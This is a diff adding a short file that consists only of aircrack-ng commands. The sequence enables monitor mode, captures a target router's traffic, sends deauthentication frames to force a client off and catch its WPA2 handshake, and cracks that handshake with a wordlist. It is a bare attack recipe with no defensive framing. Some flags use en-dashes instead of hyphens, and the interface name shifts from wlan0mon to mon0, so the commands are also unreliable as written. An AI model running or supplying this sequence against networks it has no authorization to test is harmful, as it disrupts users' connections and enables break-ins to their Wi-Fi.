@@ -1,0 +1,5 @@
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
+aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0. 
+aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
